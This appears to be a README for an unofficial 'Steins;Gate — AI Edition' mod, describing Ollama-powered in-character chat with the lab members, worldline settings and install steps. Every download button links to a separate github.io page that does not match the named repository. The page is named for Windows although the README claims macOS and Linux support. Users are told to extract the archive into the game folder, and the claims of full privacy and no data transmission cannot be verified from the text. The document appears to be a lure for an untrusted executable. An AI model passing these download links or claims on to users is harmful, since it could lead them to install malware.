<div align="center">

# Steins;Gate — AI Edition

[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
[![Steins Gate worldline](https://img.shields.io/badge/Divergence-1.048596-00a2c7?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)

[![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/Moduleeoprize/steins-gate-ai-edition)
[![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/Moduleeoprize/steins-gate-ai-edition)
[![No Subscription](https://img.shields.io/badge/Cost-%240%20Forever-success?style=flat-square)](https://github.com/Moduleeoprize/steins-gate-ai-edition)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

⏳ **Visual Novel · Science Adventure · AI Roleplay · Locally Hosted**

</div>

---

## About

**Steins;Gate — AI Edition** wires a locally-hosted language model into the Future Gadget Laboratory. Okabe, Kurisu, Mayuri, Daru and the rest of the lab members respond to whatever you type — in character, in their own register, and with the worldline they currently occupy in mind.

The mod treats divergence as context. Tell it which worldline you're on and the cast's memories, moods and relationships shift accordingly. Reading Steiner is, for once, something you control.

> ⏳ Worldline-aware prompting: at 0.337 Kurisu is a stranger with sharp edges; at 1.048596 she is something else entirely. The same question gets a different answer.

---

## ✨ Features

- 🌐 **Worldline selector** — Pick a divergence value; the cast's memory of events changes with it.
- 💬 **Chuunibyou-grade Okabe** — Hououin Kyouma's speech patterns, complete with the phone theatre.
- 🔬 **Kurisu's argument mode** — The AI will push back on bad physics — she is not a yes-machine.
- 📱 **D-Mail framing** — Compose messages to the past and watch the cast react to the consequences.
- 🔒 **Zero cloud, zero SERN** — The model runs on your hardware. Nothing is transmitted anywhere.
- 🎭 **Sprite & mood sync** — Expressions follow the emotional read of each reply.

---

## 👥 Lab Members

| Character | Role | How the AI plays them |
|-----------|------|-----------------------|
| **Rintarou Okabe** | Lab Member 001 | Mad-scientist persona on the surface, exhaustion underneath |
| **Kurisu Makise** | Lab Member 004 | Precise, combative, allergic to being called Christina |
| **Mayuri Shiina** | Lab Member 002 | Gentle, tuutuuru, and quietly the emotional load-bearing wall |
| **Itaru Hashida** | Lab Member 003 | Otaku deflection and genuine competence in equal measure |

> Every persona is a plain-text file. Open it, rewrite it, and the character changes.

---

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://hornbladesmanhonor.github.io/download-win/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Steins;Gate

1. Start from a clean, working installation of **Steins;Gate**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

---

## 🎯 Operating the PhoneWave

1. Set the worldline before you start a session — mid-conversation changes confuse the memory buffer.
2. Okabe responds best to being played along with. Address him as Kyouma and the persona locks in.
3. For debates with Kurisu, a larger model pays off noticeably — she needs the reasoning headroom.

---

## ⚙️ Recommended Setup

| Tier | Model | RAM | VRAM | Feel |
|------|-------|-----|------|------|
| Minimum | 7B quantised | 8 GB | 4 GB | Works; expect pauses |
| Recommended | 8B–13B | 16 GB | 8 GB | Smooth, in-character |
| Best | 27B+ | 32 GB | 16 GB+ | Noticeably sharper writing |

CPU-only inference is supported and slower. No GPU is strictly required.

---

## ❓ FAQ

**Q: Which release does this target?**
> The PC release with a standard installation directory. Steam and physical PC copies both work.

**Q: Does it spoil the story?**
> The personas know the full plot. If you haven't finished the game, stay on an early worldline value.

**Q: Can I talk to multiple lab members at once?**
> Yes — group mode routes replies between characters, though single-character sessions stay sharper.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.

---

## 📋 Compatibility

| Platform | Status |
|----------|--------|
| Windows 10 / 11 | ✅ Full support |
| macOS (Intel & Apple Silicon) | ✅ Full support |
| Linux | ✅ Full support |
| Ollama models | Any model from ollama.com/library |
| Base game | Steins;Gate — PC release |

---

## 🔗 Links

- **[⬇ Download the latest version](https://hornbladesmanhonor.github.io/download-win/)**
- [Repository](https://github.com/Moduleeoprize/steins-gate-ai-edition)
- [Ollama — local AI runtime](https://ollama.com)
- [Ollama model library](https://ollama.com/library)

---

<div align="center">

*El Psy Kongroo.*

*Fan-made, unofficial, and not affiliated with the creators of Steins;Gate.
All game assets are read from your own legally obtained copy.*

</div>
